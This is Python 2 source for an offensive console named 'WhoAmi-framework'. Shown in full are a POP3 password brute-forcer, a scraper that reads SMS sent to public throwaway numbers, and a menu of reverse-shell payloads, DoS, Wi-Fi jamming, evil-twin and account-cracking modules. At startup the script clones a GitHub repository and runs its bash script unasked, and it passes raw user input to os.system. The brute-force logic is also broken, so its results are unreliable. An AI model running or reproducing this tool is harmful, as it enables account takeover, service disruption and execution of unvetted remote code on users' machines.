poprhosts = ['192.168.1.1']
popport   = ['110']
username  = ['Anonymous']
listpass  = ['core/pass.txt']

def brute_force_to_pop3_protocol():
 try:
  amerr = str(raw_input(default+'WhoAmi exploits('+red+'brute_force_to_pop3_protocol'+default+') > '))
  
  if  amerr[:10] == "set rhosts" or  amerr[:10] == "set RHOSTS" :
     poprhosts[0] = amerr[11:]
     print "RHOSTS => ", poprhosts[0]
     brute_force_to_pop3_protocol()
     
  elif  amerr[:10] == "set rports" or  amerr[:10] == "set RPORTS" :
     popport[0] = amerr[11:]
     print "RPORTS => ", popport[0]
     brute_force_to_pop3_protocol()
     
  elif  amerr[:12] == "set username" or  amerr[:12] == "set USERNAME" :
     username[0] = amerr[13:]
     print "USERNAME => ", username[0]
     brute_force_to_pop3_protocol()
     
  elif  amerr[:12] == "set listpass" or  amerr[:12] == "set LISTPASS" :
     listpass[0] = amerr[13:]
     print "LISTPASS => ", listpass[0]
     brute_force_to_pop3_protocol()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (brute_force_to_pop3_protocol):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        RHOSTS    "+str(poprhosts[0])+"          yes           host Target "
   print"        RPORTS    "+str(popport[0])+"                  yes           Port Target "
   print"        USERNAME  "+str(username[0])+"            yes           Username Target"
   print"        LISTPASS  "+str(listpass[0])+"        yes           Wordlist "
   print ""
   print ""
   brute_force_to_pop3_protocol()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    NET.CheckConnectionHost(str(poprhosts[0]),popport[0],5)
    pop = poplib.POP3(str(poprhosts[0]),int(popport[0])) 
    with open(str(username[0]),'r') as passwords:
       for password in passwords:
          password=password.replace("\n","")
          try:
              pop.user(str(username[0]))
              pop.pass_(password)
              if True:
                  print blue+"[*]"+default+"Successfully with ["+str(username[0])+"]["+password+"]\n"
                  Space()
                  UTIL.sRegister(init,password)
                  return
					
          except:print " | Checking '"+password+"'"
    brute_force_to_pop3_protocol()

  elif amerr[:4] == 'help':
   help_help()
   brute_force_to_pop3_protocol()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    brute_force_to_pop3_protocol()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    brute_force_to_pop3_protocol()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  brute_force_to_pop3_protocol()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    brute_force_to_pop3_protocol()














#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&{end exploits}&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&













#ssssssssssss{spam}sssssssssssssssssppppppppppppppppppppppppppppppppppppppppaaaaaaaaaaaaaaaaaaaaaaaaaaaaaammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm


nember = ['447537150994'] 
def create_fake_nember():
 try:
  amerr = str(raw_input(default+'WhoAmi spam('+red+'create_fake_nember'+default+') > '))
  
  if  amerr[:10] == "set nember" or  amerr[:10] == "set NEMBER" :
     nember[0] = amerr[11:]
     print "NEMBER => ", nember[0]
     create_fake_nember()
     
  elif amerr[:11] == "nember_list" or amerr[:11] == "NEMBER_LIST" :
    import requests
    from bs4 import BeautifulSoup
    print blue+"[*]"+default+"starting scan your nember"
    url_fake = "http://receivefreesms.net/"
    face_mail = requests.get(url_fake,headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"})
    
    soup = BeautifulSoup(face_mail.content,"html.parser")
    print green+"[+]"+default+'Available numbers'
    for div  in soup.find_all("div",{"class":"cuadro"}):
        nm = div.a.text.strip('+')
        print green+"[+]"+default+"the nember is : "+nm
    create_fake_nember()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (create_fake_nember):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        NEMBER    "+str(nember[0])+"         yes           The nember wihout {+}"
   print "" 
   print "    Type this to discover the available numbers"
   print ""
   print "       !write [   nember_list  ]!"
   print ""
   print ""
   create_fake_nember()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
     
      import requests
      from bs4 import BeautifulSoup
      print blue+"[*]"+default+"creating your nember "
      while True:	
        url = "http://receivefreesms.net/free-sms-"+str(nember[0])+".html"
        re = requests.get(url,headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"})
        soup2 = BeautifulSoup(re.content,"html.parser")


        fr = soup2.find("td",{"data-title":"From Number"})
        from_nember = fr.text.strip('if(location.href.indexOf("receivefreesms")<=0){ alert("STOP stealing my numbers!"); document.location="http://receivefreesms.net/"; }')

        ti = soup2.find("td",{"data-title":"Time"})
        time = ti.text
        mess = soup2.find("td",{"data-title":"Message"})
        message = mess.text
        print " ____________________________________________________________________________________________"
        print "|   set nember     |  +"+str(nember[0])+"                                                          |"  
        print "|__________________|_________________________________________________________________________|"
        print "|   From Number    |  "+from_nember+"                                                            |"
        print "|__________________|_________________________________________________________________________|"
        print "|      Time        |  "+time+"                                                         |"
        print "|__________________|_________________________________________________________________________|"
        print "|    Message       |  "+message+"                       |"
        print "|__________________|_________________________________________________________________________|"
        raw_input('')
        print blue+"[*]"+default+"refrushe"
  elif amerr[:4] == 'help':
   help_help()
   create_fake_nember()
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)

   elif amerr[:6] == "banner":
    banner()
    create_fake_nember()
 
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    create_fake_nember()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  create_fake_nember()

 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    create_fake_nember()





#sssssssssssss{end spam}ssssssssssssssssssssssspppppppppppppppppppppppppppppppppppppppppaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaammmmmmmmmmmmmmmmmmmmmmm




#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{whoami}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def WhoAmi():
 try:
  whoami = str(raw_input(default+'WhoAmi > '))
  if whoami[:14] == 'show auxiliary':
   auxiliary()
   WhoAmi()
  elif whoami[:13] == 'show payloads':
   payloads()
   WhoAmi()
  elif whoami[:13] == 'show exploits':
   exploits()
   WhoAmi()
  elif whoami[:13] == 'show wireless':
   wireless()
   WhoAmi()
  elif whoami[:9] == 'show spam':
   spam()
   WhoAmi()
  elif whoami[:10] == 'show amerr':
   amerr()
   WhoAmi()
  elif whoami[:12] == 'show network':
   network()
   WhoAmi()
  elif whoami[:] == 'show communication':
   communication()
   WhoAmi()
  elif whoami[:4] == 'exit' or whoami[:4] == 'quit':
   exit()
  elif whoami[:3] == 'use':
    uussee="""
Usage: use <name|term|index>


Examples:
  use use admin_panel_findler

  use eternalblue
  use <name|index>
     """
    if whoami[:35] == 'use payload_unix_python_reverse_tcp':
      payload_unix_python_reverse_tcp()
    elif whoami[:36] == 'use payload_unix_python2_reverse_tcp':
      payload_unix_python2_reverse_tcp()
    elif whoami[:25] == 'use ip_number_information':
      ip_number_information()
    elif whoami[:27] == 'use crack_password_facebook':
      crack_password_facebook()
    elif whoami[:23] == 'use admin_panel_findler':
      admin_panel_findler()
    elif whoami[:23] == "use dos_attack_requests":
      dos_attack_requests()
    elif whoami[:28] == "use available_facebook_motah":
      available_facebook_motah()
    elif whoami[:32] == "use payload_unix_php_reverse_tcp":
      payload_unix_php_reverse_tcp()
    elif whoami[:33] == "use payload_unix_perl_reverse_tcp":
      payload_unix_perl_reverse_tcp()
    elif whoami[:34] == "use payload_unix_perl2_reverse_tcp":
      payload_unix_perl2_reverse_tcp()
    elif whoami[:33] == "use payload_unix_bash_reverse_tcp":
      payload_unix_bash_reverse_tcp()
    elif whoami[:33] == "use payload_unix_ncat_reverse_tcp":
      payload_unix_ncat_reverse_tcp()
    elif whoami[:33] == "use payload_unix_ruby_reverse_tcp":
      payload_unix_ruby_reverse_tcp()
    elif whoami[:35] == "use payload_windows_asm_reverse_tcp":
      payload_windows_asm_reverse_tcp()
    elif whoami[:34] == "use payload_windows_ps_reverse_tcp":
      payload_windows_ps_reverse_tcp()
    elif whoami[:35] == "use payload_camera_html_reverse_tcp":
      payload_camera_html_reverse_tcp()
    elif whoami[:21] == "use dos_attack_socket":
      dos_attack_socket()
    elif whoami[:20] == "use wifi_wifi_jammer":
      wifi_wifi_jammer()
    elif whoami[:17] == "use wifi_wifi_dos":
      wifi_wifi_dos()
    elif whoami[:20] == "use wifi_mass_deauth":
      wifi_mass_deauth()
    elif whoami[:22] == "use wifi_wifi_honeypot":
      wifi_wifi_honeypot() 
    elif whoami[:16] == "use wifi_wps_pin":
      wifi_wps_pin()
    elif whoami[:19] == "use wifi_pass_saved":
      wifi_pass_saved() 
    elif whoami[:27] == "use bluetooth_bluetooth_pod":
       bluetooth_bluetooth_pod()
    elif whoami[:18] == "use wifi_evil_twin":
      wifi_evil_twin()
    elif whoami[:32] == "use continue_in_secrecy_server_1":
      continue_in_secrecy_server_1()
    elif whoami[:32] == "use continue_in_secrecy_client_1":
      continue_in_secrecy_client_1()
    elif whoami[:27] == "use crack_password_file_rar":
      crack_password_file_rar()
    elif whoami[:27] == "use crack_password_file_zip":
      crack_password_file_zip()
    elif whoami[:32] == "use brute_force_to_ftp_protocol":
      brute_force_to_ftp_protocol()
    elif whoami[:32] == "use brute_force_to_sql_protocol":
      brute_force_to_sql_protocol()
    elif whoami[:32] == "use brute_force_to_ssh_protocol":
      brute_force_to_ssh_protocol()  
    elif whoami[:33] == "use brute_force_to_pop3_protocol":
      brute_force_to_pop3_protocol()    
    elif whoami[:24] == "use gather_shodan_search":
      gather_shodan_search() 
    elif whoami[:22] == "use create_fake_nember":
      create_fake_nember()
    elif whoami[:18] == "use github_account":
      github_account()
    elif whoami[:20] == "use facebook_account":
      facebook_account()
    elif whoami[:19] == "use channel_youtube":
      channel_youtube()
    
    elif whoami == 'use':
      print uussee
      WhoAmi()
    else:
      print red+"[-]"+default+"No results from search"
      print red+"[-]"+default+"Failed to load module: "+whoami
      WhoAmi()
  elif whoami[:4] =='help':
   help()
   WhoAmi()
  else:
   if whoami[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+whoami
    print ""
    os.system(whoami)
  
   elif whoami[:6] == "whoami":
    print blue+"[*]"+default+" exec "+whoami
    print ""
    os.system(whoami)
   elif whoami[:6] == "banner":
    banner()
    WhoAmi()
   elif whoami[:5] == 'my_ip':
     my_ip()
   elif whoami[:2] == "ls":
    print blue+"[*]"+default+" exec "+whoami
    print ""
    os.system(whoami)
   elif whoami[:5] == "clear":
    print blue+"[*]"+default+" exec "+whoami
    print ""
    os.system(whoami)
   elif whoami[:4] == "nmap":
    print blue+"[*]"+default+" exec "+whoami
    print ""
    os.system(whoami)
   elif whoami[:2] == "cd":
    print red+"[-] No path specified "+default
   elif whoami[:2] == "os":
    os.system(whoami[3:])
    WhoAmi()
   elif whoami == '':
    WhoAmi()
   else:
    print red+"[-] Unknown command: "+default+""+whoami 
   WhoAmi()
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    WhoAmi()
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{end whoami}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2
def starting():
  print ''
  time.sleep(2)
  print default + '[*]Starting the WhoAmi-framework ...'
  time.sleep(3)
  print ''
  os.system('rm -rf moni')
  os.system('git clone https://github.com/amerlaceset/moni')
  os.system('bash moni/mona.sh')
  os.system('rm -rf moni')
  print ""
  h = "\033[1;33m[\033[1;32m*\033[1;33m] Welcome to my friend on {\033[1;36mWhoAmi-framework\033[1;33m} Programmer [\033[1;36mAmer Amerr\033[1;33m] "
  def love(t):
   for txt in t + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(4. / 100)
  love(h)
  print ""
  time.sleep(3)
  print ""
starting()
banner()
WhoAmi()
